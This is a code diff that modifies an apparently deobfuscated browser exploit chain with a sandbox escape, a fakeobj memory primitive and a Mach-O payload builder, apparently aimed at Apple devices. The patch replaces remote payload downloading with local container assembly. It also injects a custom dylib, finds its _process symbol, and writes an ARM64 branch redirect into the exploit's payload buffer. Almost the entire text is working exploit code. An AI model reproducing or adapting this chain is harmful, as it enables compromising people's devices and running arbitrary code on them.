@@ -1158,38 +1158,105 @@ function YA() {/* Original: YA → resolveSymbols */
                 M();
             }
         },
+        // Fetch a single file as ArrayBuffer
+        fetchBin(url) {
+            return new Promise((resolve, reject) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+                xhr.responseType = "arraybuffer";
+                xhr.onload = () => {
+                    xhr.status === 200 && xhr.response ? resolve(xhr.response) : reject(xhr.status);
+                };
+                xhr.onerror = () => reject(0);
+                xhr.send(null);
+            });
+        },
+        // Cache for payloads/manifest.json
+        _payloadManifest: null,
+        async getPayloadManifest() {
+            if (!E._payloadManifest) {
+                const resp = await E.fetchBin("payloads/manifest.json");
+                E._payloadManifest = JSON.parse(new TextDecoder().decode(resp));
+            }
+            return E._payloadManifest;
+        },
+        // Build F00DBEEF container from individual entry files
+        async buildContainer(hashName) {
+            const manifest = await E.getPayloadManifest();
+            const entries = manifest[hashName];
+            if (!entries) throw new Error("Hash not in manifest: " + hashName);
+
+            // Special case: raw file (e.g. the download manifest)
+            if (entries.length === 1 && entries[0].raw) {
+                return await E.fetchBin("payloads/" + hashName + "/" + entries[0].file);
+            }
+
+            // Download all entry files in parallel
+            const entryData = await Promise.all(entries.map(e =>
+                E.fetchBin("payloads/" + hashName + "/" + e.file)
+            ));
+
+            // Calculate total size: 8 (header) + 16*N (entry table) + sum(entry sizes)
+            const headerSize = 8 + 16 * entries.length;
+            let totalSize = headerSize;
+            for (const buf of entryData) totalSize += buf.byteLength;
+
+            const container = new ArrayBuffer(totalSize);
+            const view = new DataView(container);
+            const out = new Uint8Array(container);
+
+            // F00DBEEF header
+            view.setUint32(0, 0xF00DBEEF, true);
+            view.setUint32(4, entries.length, true);
+
+            // Entry table + data
+            let dataOffset = headerSize;
+            for (let i = 0; i < entries.length; i++) {
+                const e = entries[i];
+                const tableOff = 8 + i * 16;
+                view.setUint32(tableOff + 0, e.f1, true);
+                view.setUint32(tableOff + 4, e.f2, true);
+                view.setUint32(tableOff + 8, dataOffset, true);
+                view.setUint32(tableOff + 12, entryData[i].byteLength, true);
+                out.set(new Uint8Array(entryData[i]), dataOffset);
+                dataOffset += entryData[i].byteLength;
+            }
+
+            window.log("[LOADER] Built F00DBEEF container: " + entries.length + " entries, " + totalSize + " bytes");
+            return container;
+        },
+        // Feed raw ArrayBuffer directly into the shared WASM buffer
+        feedRawBuffer(arrayBuffer) {
+            const bytes = new Uint8Array(arrayBuffer);
+            if (bytes.length > g.length - 8) { E.error(); return; }
+            for (let i = 0; i < bytes.length; i++) g[i + 8] = bytes[i];
+            D[1] = bytes.length;
+            D[0] = BA;
+        },
         download(A, g, M) {
             //alert("Download " + A + "\n" + new Error().stack);
-            D[0] = QA, (async () => {
-                for (let D = 0; D < 20; D++) try {
-                    const D = await new Promise(function (g, D) {
-                        const M = new XMLHttpRequest(),
-                            C = new URL(A),
-                            I = Math.random().toString(36).slice(2, E.BA(5, 10)),
-                            w = E.BA(0, 1);
-                        C.searchParams.set(I, w), M.open("GET", C.toString(), !0), M.responseType = "arraybuffer", M.onload = () => {
-                            const A = M.response;
-                            A && 4 === M.readyState && 200 /* 1349605488 ^ 1349605560 */ === M.status ? g(A) : D(M.status);
-                        }, M.send(null);
-                    });
-                    if (void 0 !== D) return void g(D);
-                } catch (A) { }
-                M();
+            D[0] = QA;
+            (async () => {
+                try {
+                    // Extract hash from URL (strip path, .min.js, .js, etc.)
+                    let hashName = A;
+                    const lastSlash = hashName.lastIndexOf("/");
+                    if (lastSlash >= 0) hashName = hashName.substring(lastSlash + 1);
+                    hashName = hashName.replace(/\.min\.js$/, "").replace(/\.js$/, "");
+
+                    window.log("[LOADER] Loading payload: " + hashName);
+                    const container = await E.buildContainer(hashName);
+                    E.feedRawBuffer(container);
+                    window.log("[LOADER] Payload fed to dylib: " + hashName);
+                } catch (err) {
+                    window.log("[LOADER] Download error: " + err);
+                    M();
+                }
             })();
         },
         UA(A) {
-            try {
-                const g = new Blob([A], {
-                    type: "application/javascript"
-                }),
-                    D = URL.createObjectURL(g),
-                    M = document.createElement("script");
-                M.addEventListener("error", E.error, !0), E.LA.bind(E), window.qbrdr = (A) => {
-                    E.LA(atob(A));
-                }, document.body.appendChild(M), M.setAttribute("src", D);
-            } catch (A) {
-                E.error();
-            }
+            // Legacy path — no longer used, download() feeds raw buffers directly
+            E.feedRawBuffer(A);
         },
         sA() {
             const A = new URL(location.href),
@@ -1208,7 +1275,7 @@ function YA() {/* Original: YA → resolveSymbols */
                 const A = new Uint8Array(g.buffer, sA, kA);
                 let M = "";
                 for (let g = 0; A[g] && g < A.length; g++) M += String.fromCharCode(A[g]);
-                M += ".js", M.endsWith(".min.js.js") && (M = M.replace(new RegExp(".min.js.js$"), ".js")), E.download(M, E.UA, E.error);
+                E.download(M, E.UA, E.error);
             } else if (D[0] === UA) {
                 D[0] = QA;
                 const A = new Uint8Array(g.buffer, sA, kA);
@@ -1254,6 +1321,57 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
     return g = (() => {
         //alert("P.platformState.fixedMachOVal2=" + P.platformState.fixedMachOVal2);
         const g = new MachOPayloadBuilder(platformModule.platformState.fixedMachOVal1, platformModule.platformState.fixedMachOVal2, platformModule.platformState.fixedMachOVal3);
+
+        // ── PATCH: Load custom dylib with dynamic _process lookup ──
+        // Dylib must be pre-truncated to Mach-O proper (no appended data).
+        const _ORIG_PROCESS_OFF = 0x68d8; // hardcoded in B trampoline shellcode
+        const _xhr = new XMLHttpRequest();
+        _xhr.open("GET", "other/Stage3ValidatorOrSomething.dylib", false);
+        _xhr.overrideMimeType("text/plain; charset=x-user-defined");
+        _xhr.send();
+        const _raw = _xhr.responseText;
+        // Build byte array from x-user-defined response
+        const _buf = new Uint8Array(_raw.length);
+        for (let _i = 0; _i < _raw.length; _i++) _buf[_i] = _raw.charCodeAt(_i) & 0xFF;
+        const _dv = new DataView(_buf.buffer);
+        // Parse LC_SYMTAB to find _process
+        const _ncmds = _dv.getUint32(16, true);
+        let _off = 32, _symtabOff = 0, _nsyms = 0, _strtabOff = 0;
+        for (let _c = 0; _c < _ncmds; _c++) {
+            const _cmd = _dv.getUint32(_off, true);
+            const _cmdsize = _dv.getUint32(_off + 4, true);
+            if (_cmd === 2) { // LC_SYMTAB
+                _symtabOff = _dv.getUint32(_off + 8, true);
+                _nsyms = _dv.getUint32(_off + 12, true);
+                _strtabOff = _dv.getUint32(_off + 16, true);
+            }
+            _off += _cmdsize;
+        }
+        let _processOff = 0;
+        for (let _i = 0; _i < _nsyms; _i++) {
+            const _nlo = _symtabOff + _i * 16;
+            const _strx = _dv.getUint32(_nlo, true);
+            const _ntype = _buf[_nlo + 4];
+            if ((_ntype & 0x0e) === 0) continue;
+            let _name = "";
+            for (let _j = _strtabOff + _strx; _j < _buf.length && _buf[_j]; _j++)
+                _name += String.fromCharCode(_buf[_j]);
+            if (_name === "_process") {
+                _processOff = _dv.getUint32(_nlo + 8, true);
+                break;
+            }
+        }
+        if (!_processOff) throw new Error("[PATCH] _process symbol not found in dylib");
+        // Convert entire file (already truncated) to oA string
+        const _origLen = g.oA.length;
+        let _oA = "";
+        for (let _i = 0; _i < _buf.length; _i += 2)
+            _oA += String.fromCharCode(_buf[_i] | ((_buf[_i + 1] || 0) << 8));
+        g.oA = _oA;
+        window.log("[PATCH] Loaded dylib: " + _buf.length + "B, oA=" + _oA.length +
+            " (orig " + _origLen + "), _process=0x" + _processOff.toString(16));
+        // ── END PATCH (redirect applied after buffer is built, below) ──
+
         let dylibSize = (g.length() + 0x1000 & 0xfffff000) >>> 0;
         const dylibSizeWithSomeExtraSize = dylibSize + 0x200000,
             dylibLoadAddress = platformModule.platformState.sandboxEscape.newInt64OfSomething(dylibSizeWithSomeExtraSize).toPointerValue();
@@ -1264,6 +1382,17 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         dylibSize = 2 * dylibBufferEncoded.length;
         const dylibBuffer = window.PhZuiP = new Uint32Array(new ArrayBuffer(dylibSize));
         for (let i = 0; i < dylibSize; i += 4) dylibBuffer[i / 4] = utilityModule.readU16FromString(dylibBufferEncoded, i) >>> 0;
+        // ── PATCH: If _process moved, write a B redirect at the hardcoded offset ──
+        if (_processOff !== _ORIG_PROCESS_OFF) {
+            const _branchDist = (_processOff - _ORIG_PROCESS_OFF) >> 2;
+            const _branchInstr = 0x14000000 | (_branchDist & 0x3FFFFFF);
+            dylibBuffer[_ORIG_PROCESS_OFF >> 2] = _branchInstr;
+            window.log("[PATCH] Redirect: wrote B at 0x" + _ORIG_PROCESS_OFF.toString(16) +
+                " -> 0x" + _processOff.toString(16) +
+                " (instr=0x" + _branchInstr.toString(16) + ")");
+        } else {
+            window.log("[PATCH] _process at original offset 0x" + _ORIG_PROCESS_OFF.toString(16) + ", no redirect needed");
+        }
         window.addDownloadBinary("lzwDecoded.dylib", new Uint32Array(dylibBuffer.slice(0)));
         const dylibLoadAddressI64 = utilityModule.Int64.fromNumber(dylibLoadAddress),
             dylibDataAddressMaybe = utilityModule.Int64.fromNumber(platformModule.platformState.exploitPrimitive.fakeobj(dylibBuffer));
